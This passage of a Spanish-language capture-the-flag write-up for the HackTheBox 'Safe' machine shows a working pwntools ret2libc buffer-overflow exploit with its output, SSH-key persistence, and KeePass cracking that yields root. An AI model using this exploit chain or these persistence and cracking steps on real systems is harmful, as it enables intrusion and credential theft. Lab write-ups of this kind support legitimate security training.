<code><span class="ve">❯ ropper </span><span class="p">--file myapp --search </span><span class="am">"pop rdi; ret;"</span><span class="p">
</span><span class="ve">[INFO] </span><span class="p">Load gadgets from cache
</span><span class="ve">[LOAD] </span><span class="p">loading... 100%
</span><span class="ve">[LOAD] </span><span class="p">removing double gadgets... 100%
</span><span class="ve">[INFO] </span><span class="p">Searching for gadgets: pop rdi; ret;

</span><span class="ve">[INFO] </span><span class="p">File: myapp
</span><span class="ro">0x000000000040120b</span><span class="p">: </span><span class="am">pop </span><span class="p">rdi</span><span class="az">; </span><span class="am">ret</span><span class="az">;</span>
</code></pre></div></div><br>

<p class="plain-text">Despues de rellenar con las <code class="language-plaintext highlighter-rouge">A's</code> enviaremos mediante <code class="language-plaintext highlighter-rouge">POP RDI</code> la direccion de <code class="language-plaintext highlighter-rouge">puts@got.plt</code> para posteriormente ejecutarla <code class="language-plaintext highlighter-rouge">system@plt</code>, al ejecutar con systema esta direccion a traves del <code class="language-plaintext highlighter-rouge">error</code> nos lekeara la direccion completa de <code class="language-plaintext highlighter-rouge">puts</code></p>
<a href="/htb/safe/9.png" target="_blank"><div><p><img src="/htb/safe/9.png"></p></div></a>

<p class="plain-text">Plasmamos esto en un script de <code class="language-plaintext highlighter-rouge">python</code> y al ejecutarlo un par de veces encontramos que mediante el <code class="language-plaintext highlighter-rouge">error</code> de sh nos muestra la direccion de <code class="language-plaintext highlighter-rouge">puts</code> que es dinamica</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="c1">#!/usr/bin/python3
</span><span class="o">from </span><span class="p">pwn </span><span class="o">import </span><span class="p">remote, p64

offset </span><span class="o">= </span><span class="mi">120</span><span class="p">
junk </span><span class="o">= </span><span class="no">b</span><span class="s">"A" </span><span class="o">* </span><span class="p">offset

pop_rdi </span><span class="o">= </span><span class="p">p64(</span><span class="mi">0x40120b</span><span class="p">)
got_puts </span><span class="o">= </span><span class="p">p64(</span><span class="mi">0x404018</span><span class="p">)
plt_system </span><span class="o">= </span><span class="p">p64(</span><span class="mi">0x401040</span><span class="p">)
main </span><span class="o">= </span><span class="p">p64(</span><span class="mi">0x40115f</span><span class="p">)

payload </span><span class="o">=  </span><span class="no">b</span><span class="s">""</span><span class="p">
payload </span><span class="o">+= </span><span class="p">junk
payload </span><span class="o">+= </span><span class="p">pop_rdi </span><span class="o">+ </span><span class="p">got_puts
payload </span><span class="o">+= </span><span class="p">plt_system
payload </span><span class="o">+= </span><span class="p">main

shell </span><span class="o">= </span><span class="p">remote(</span><span class="s">"safe.htb"</span><span class="p">, </span><span class="mi">1337</span><span class="p">)  

shell.recvline()
shell.sendline(payload)
</span><span class="no">print</span><span class="p">(shell.recvline())</span>
</code></pre></div></div><br>

<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">❯ python3 </span><span class="p">exploit.py
[</span><span class="ve">+</span><span class="p">] Opening connection to safe.htb on port 1337: Done  
b'sh: 1: \x90\x8f\x98\xeb:\x7f: not found\n'
[</span><span class="az">*</span><span class="p">] Closed connection to safe.htb port 1337

</span><span class="ve">❯ python3 </span><span class="p">exploit.py
[</span><span class="ve">+</span><span class="p">] Opening connection to safe.htb on port 1337: Done  
b'sh: 1: \x90\x8f\x14\x06d\x7f: not found\n'
[</span><span class="az">*</span><span class="p">] Closed connection to safe.htb port 1337</span>
</code></pre></div></div><br>

<p class="plain-text">Modificamos el script para con que con <code class="language-plaintext highlighter-rouge">u64</code> le demos a la direccion lekeada un mejor <code class="language-plaintext highlighter-rouge">formato</code> el cual python pueda interpretar correctamente en algunas operaciones</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="c1">#!/usr/bin/python3
</span><span class="o">from </span><span class="p">pwn </span><span class="o">import </span><span class="p">remote, p64, u64, log

offset </span><span class="o">= </span><span class="mi">120</span><span class="p">
junk </span><span class="o">= </span><span class="no">b</span><span class="s">"A" </span><span class="o">* </span><span class="p">offset

pop_rdi </span><span class="o">= </span><span class="p">p64(</span><span class="mi">0x40120b</span><span class="p">)
got_puts </span><span class="o">= </span><span class="p">p64(</span><span class="mi">0x404018</span><span class="p">)
plt_system </span><span class="o">= </span><span class="p">p64(</span><span class="mi">0x401040</span><span class="p">)
main </span><span class="o">= </span><span class="p">p64(</span><span class="mi">0x40115f</span><span class="p">)

payload </span><span class="o">=  </span><span class="no">b</span><span class="s">""</span><span class="p">
payload </span><span class="o">+= </span><span class="p">junk
payload </span><span class="o">+= </span><span class="p">pop_rdi </span><span class="o">+ </span><span class="p">got_puts
payload </span><span class="o">+= </span><span class="p">plt_system
payload </span><span class="o">+= </span><span class="p">main

shell </span><span class="o">= </span><span class="p">remote(</span><span class="s">"safe.htb"</span><span class="p">, </span><span class="mi">1337</span><span class="p">)

shell.recvline()
shell.sendline(payload)

leak_puts </span><span class="o">= </span><span class="p">u64(shell.recvline().strip()[</span><span class="mi">7</span><span class="p">:</span><span class="o">-</span><span class="mi">11</span><span class="p">].ljust(</span><span class="mi">8</span><span class="p">,</span><span class="no">b</span><span class="s">"</span><span class="mi">\x00</span><span class="s">"</span><span class="p">))  
log.info(</span><span class="no">f</span><span class="s">"Leaked puts: </span><span class="p">{</span><span class="no">hex</span><span class="p">(leak_puts)}</span><span class="s">"</span><span class="p">)</span>
</code></pre></div></div><br>

<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">❯ python3 </span><span class="p">exploit.py
[</span><span class="ve">+</span><span class="p">] Opening connection to safe.htb on port 1337: Done  
[</span><span class="az">*</span><span class="p">] Leaked puts: 0x7f6ef6156f90
[</span><span class="az">*</span><span class="p">] Closed connection to safe.htb port 1337</span>
</code></pre></div></div><br>


<p class="plain-text">En <a href="https://libc.rip/">libc.rip</a> podemos encontar las direcciones base de diferentes funciones, entre ellas <code class="language-plaintext highlighter-rouge">puts</code> que es <code class="language-plaintext highlighter-rouge">0x68f90</code>, el leak de puts que conseguimos antes nos muestra la direccion de <code class="language-plaintext highlighter-rouge">puts</code> a la cual se le ha sumado la direcion de <code class="language-plaintext highlighter-rouge">libc base</code>, asi que si al leak le restamos la direccion <code class="language-plaintext highlighter-rouge">base</code> de puts obtenemos <code class="language-plaintext highlighter-rouge">libc_base</code> y si a esta le sumamos la direccion base de <code class="language-plaintext highlighter-rouge">/bin/sh</code> obtenemos una direccion de /bin/sh</p>
<a href="/htb/safe/4.png" target="_blank"><div><p><img src="/htb/safe/4.png"></p></div></a>

<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="p">libc_base </span><span class="o">= </span><span class="p">leak_puts </span><span class="o">- </span><span class="mi">0x68f90</span><span class="p">

bin_sh </span><span class="o">= </span><span class="p">p64(libc_base </span><span class="o">+ </span><span class="mi">0x161c19</span><span class="p">)</span>
</code></pre></div></div><br>

<p class="plain-text">Ya con la direccion de <code class="language-plaintext highlighter-rouge">/bin/sh</code> podemos simplemente enviarla al registro <code class="language-plaintext highlighter-rouge">RDI</code> con <code class="language-plaintext highlighter-rouge">POP RDI</code> para despues ejecutar <code class="language-plaintext highlighter-rouge">system@plt</code> y tome como argumento esta string</p>
<a href="/htb/safe/10.png" target="_blank"><div><p><img src="/htb/safe/10.png"></p></div></a>

<p class="plain-text">La primera parte de nuestro exploit final nos ayudara a conseguir la direccion de <code class="language-plaintext highlighter-rouge">libc_base</code> y la segunda ejecutar <code class="language-plaintext highlighter-rouge">/bin/sh</code> con la funcion <code class="language-plaintext highlighter-rouge">system@plt</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="c1">#!/usr/bin/python3
</span><span class="o">from </span><span class="p">pwn </span><span class="o">import </span><span class="p">remote, p64, u64

offset </span><span class="o">= </span><span class="mi">120</span><span class="p">
junk </span><span class="o">= </span><span class="no">b</span><span class="s">"A" </span><span class="o">* </span><span class="p">offset

got_puts </span><span class="o">= </span><span class="p">p64(</span><span class="mi">0x404018</span><span class="p">)
pop_rdi </span><span class="o">= </span><span class="p">p64(</span><span class="mi">0x40120b</span><span class="p">)
plt_system </span><span class="o">= </span><span class="p">p64(</span><span class="mi">0x401040</span><span class="p">)
main </span><span class="o">= </span><span class="p">p64(</span><span class="mi">0x40115f</span><span class="p">)

payload </span><span class="o">=  </span><span class="no">b</span><span class="s">""</span><span class="p">
payload </span><span class="o">+= </span><span class="p">junk
payload </span><span class="o">+= </span><span class="p">pop_rdi </span><span class="o">+ </span><span class="p">got_puts
payload </span><span class="o">+= </span><span class="p">plt_system
payload </span><span class="o">+= </span><span class="p">main

shell </span><span class="o">= </span><span class="p">remote(</span><span class="s">"safe.htb"</span><span class="p">, </span><span class="mi">1337</span><span class="p">)

shell.recvline()
shell.sendline(payload)

leak_puts </span><span class="o">= </span><span class="p">u64(shell.recvline().strip()[</span><span class="mi">7</span><span class="p">:</span><span class="o">-</span><span class="mi">11</span><span class="p">].ljust(</span><span class="mi">8</span><span class="p">,</span><span class="no">b</span><span class="s">"</span><span class="mi">\x00</span><span class="s">"</span><span class="p">))  
libc_base </span><span class="o">= </span><span class="p">leak_puts </span><span class="o">- </span><span class="mi">0x68f90</span><span class="p">

bin_sh </span><span class="o">= </span><span class="p">p64(libc_base </span><span class="o">+ </span><span class="mi">0x161c19</span><span class="p">)

payload  </span><span class="o">= </span><span class="no">b</span><span class="s">""</span><span class="p">
payload </span><span class="o">+= </span><span class="p">junk
payload </span><span class="o">+= </span><span class="p">pop_rdi </span><span class="o">+ </span><span class="p">bin_sh
payload </span><span class="o">+= </span><span class="p">plt_system

shell.recvline()
shell.sendline(payload)
shell.interactive()</span>
</code></pre></div></div><br>

<p class="plain-text">Finalmente ejecutamos el script que explota el <code class="language-plaintext highlighter-rouge">buffer overflow</code> y nos da una shell</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">❯ python3 </span><span class="p">exploit.py
[</span><span class="ve">+</span><span class="p">] Opening connection to safe.htb on port 1337: Done
[</span><span class="az">*</span><span class="p">] Switching to interactive mode
</span><span class="ro">$ </span><span class="p">whoami
user
</span><span class="ro">$ </span><span class="p">hostname -I
10.10.10.147
</span><span class="ro">$ </span><span class="p">cat /home/user/user.txt
c15**************************ef9
</span><span class="ro">$</span>
</code></pre></div></div><br>

<p class="plain-text">Para obtener una <code class="language-plaintext highlighter-rouge">shell</code> mas comoda podemos guardar nuestra clave <code class="language-plaintext highlighter-rouge">publica</code> como autorizada en la maquina para despues conectarnos por <code class="language-plaintext highlighter-rouge">ssh</code> sin contraseña</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">$ </span><span class="p">echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIE7DwLVBJlEPeKvWMKsQTsU7m4ULfVSJRx1hVaZAo0Rv kali@kali" > /home/user/.ssh/authorized_keys  
</span><span class="ro">$</span>
</code></pre></div></div><br>

<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">❯ ssh </span><span class="p">user@safe.htb
</span><span class="ve">user@safe</span><span class="p">:</span><span class="az">~</span><span class="p">$ whoami
user
</span><span class="ve">user@safe</span><span class="p">:</span><span class="az">~</span><span class="p">$ hostname -I
10.10.10.147 
</span><span class="ve">user@safe</span><span class="p">:</span><span class="az">~</span><span class="p">$ cat user.txt
c15**************************ef9  
</span><span class="ve">user@safe</span><span class="p">:</span><span class="az">~</span><span class="p">$</span>
</code></pre></div></div><br>

</section>
<section class="post" id="shell-root">
<br><h3 class="post-title">Shell - root</h3><br>

<p class="plain-text">En el directorio home del usuario <code class="language-plaintext highlighter-rouge">user</code> podemos encontrar un archivo de kepass <code class="language-plaintext highlighter-rouge">MyPasswords.kdbx</code> y varios archivos de extension <code class="language-plaintext highlighter-rouge">JPG</code> que son solo imagenes</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">user@safe</span><span class="p">:</span><span class="az">~</span><span class="p">$ ls -l
-rw-r--r-- 1 user user 1907614 May 13  2019 IMG_0545.JPG
-rw-r--r-- 1 user user 1916770 May 13  2019 IMG_0546.JPG
-rw-r--r-- 1 user user 2529361 May 13  2019 IMG_0547.JPG
-rw-r--r-- 1 user user 2926644 May 13  2019 IMG_0548.JPG
-rw-r--r-- 1 user user 1125421 May 13  2019 IMG_0552.JPG
-rw-r--r-- 1 user user 1085878 May 13  2019 IMG_0553.JPG
-rwxr-xr-x 1 user user   16592 May 13  2019 myapp
-rw-r--r-- 1 user user    2446 May 13  2019 MyPasswords.kdbx  
-rw------- 1 user user      33 Jul 14 19:27 user.txt
</span><span class="ve">user@safe</span><span class="p">:</span><span class="az">~</span><span class="p">$</span>
</code></pre></div></div><br>

<p class="plain-text">Para descargar todos los archivos podemos usar <code class="language-plaintext highlighter-rouge">scp</code> aprovechando la conexion ssh</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">❯ scp </span><span class="p">user@safe.htb:</span><span class="am">'*'</span><span class="p"> .
IMG_0545.JPG                               100% 1863KB 695.1KB/s   00:02  
IMG_0546.JPG                               100% 1872KB 703.2KB/s   00:02  
IMG_0547.JPG                               100% 2470KB 636.0KB/s   00:03  
IMG_0548.JPG                               100% 2858KB 570.2KB/s   00:05  
IMG_0552.JPG                               100% 1099KB 549.4KB/s   00:02  
IMG_0553.JPG                               100% 1060KB 571.9KB/s   00:01  
MyPasswords.kdbx                           100% 2446     7.5KB/s   00:00  
myapp                                      100%   16KB  50.1KB/s   00:00  
user.txt                                   100%   33     0.1KB/s   00:00  </span>
</code></pre></div></div><br>

<p class="plain-text">Usando <code class="language-plaintext highlighter-rouge">keepass2john</code> podemos crear un hash tanto de el archivo <code class="language-plaintext highlighter-rouge">kdbx</code> como para cada una de las imagenes <code class="language-plaintext highlighter-rouge">JPG</code>, despues con john podemos romper este <code class="language-plaintext highlighter-rouge">hash</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">❯ keepass2john </span><span class="p">MyPasswords.kdbx > hash

</span><span class="ve">❯ </span><span class="am">for </span><span class="p">image in </span><span class="sa">$(</span><span class="ve">ls </span><span class="p">IMG</span><span class="az">*</span><span class="sa">)</span><span class="p">; </span><span class="am">do </span><span class="ve">keepass2john</span><span class="p"> -k $image MyPasswords.kdbx >> hash; </span><span class="am">done  </span>
</code></pre></div></div><br>

<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">❯ john</span><span class="p"> -w:/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt hash
Using default input encoding: UTF-8
Loaded 7 password hashes with 7 different salts (KeePass [SHA256 AES 32/64])  
Remaining 6 password hashes with 6 different salts
Cost 1 (iteration count) is 60000 for all loaded hashes
Cost 2 (version) is 2 for all loaded hashes
Cost 3 (algorithm [0=AES 1=TwoFish 2=ChaCha]) is 0 for all loaded hashes
Press 'q' or Ctrl-C to abort, almost any other key for status
</span><span class="am">bullshit</span><span class="p">         (</span><span class="am">MyPasswords</span><span class="p">)
Use the "--show" option to display all of the cracked passwords reliably
Session completed.</span>
</code></pre></div></div><br>

<p class="plain-text">La contraseña que hemos conseguido con john es <code class="language-plaintext highlighter-rouge">bullshit</code>, sin embargo en <code class="language-plaintext highlighter-rouge">keepass</code> tambien necesitamos proporcionar un fichero <code class="language-plaintext highlighter-rouge">clave</code>, despues de probar cada uno de los archivos JPG encontramos que <code class="language-plaintext highlighter-rouge">IMG_0547.JPG</code> es un archivo valido</p>
<a href="/htb/safe/5.png" target="_blank"><div><p><img src="/htb/safe/5.png"></p></div></a>

<p class="plain-text">Despues de desbloquear la <code class="language-plaintext highlighter-rouge">base de datos</code> podemos encontrar una credencial llamada <code class="language-plaintext highlighter-rouge">Root password</code> que parece ser la contraseña del usuario <code class="language-plaintext highlighter-rouge">root</code></p>
<a href="/htb/safe/6.png" target="_blank"><div><p><img src="/htb/safe/6.png"></p></div></a>

<a href="/htb/safe/7.png" target="_blank"><div><p><img src="/htb/safe/7.png"></p></div></a>

<p class="plain-text">Usando esta contraseña podemos usar <code class="language-plaintext highlighter-rouge">su</code> para convertirnos en el usuario <code class="language-plaintext highlighter-rouge">root</code>, la contraseña es valida y conseguimos una <code class="language-plaintext highlighter-rouge">shell</code> como este y podemos leer la <code class="language-plaintext highlighter-rouge">flag</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">user@safe</span><span class="p">:</span><span class="az">~</span><span class="p">$ su root
Password: u3v2249dl9ptv465cogl3cnpo3fyhk  
</span><span class="ve">root@safe</span><span class="p">:</span><span class="az">~</span><span class="p"># id
uid=0(root) gid=0(root) groups=0(root)
</span><span class="ve">root@safe</span><span class="p">:</span><span class="az">~</span><span class="p"># hostname -I
10.10.10.147 
</span><span class="ve">root@safe</span><span class="p">:</span><span class="az">~</span><span class="p"># cat /root/root.txt
78b**************************a52
</span><span class="ve">root@safe</span><span class="p">:</span><span class="az">~</span><span class="p">#</span>
</code></pre></div></div><br>

</section>

</article>
  </div>
  <footer class="footer">
    <span class="footer__copyright">&copy; 2023 - GatoGamer1155</span>
  </footer><br><br>

<script type="text/javascript" src="/js/jquery.min.js"></script>
<script type="text/javascript" src="/js/main.js?1678894953382991917"></script>

    </div>
  </body>
</html>
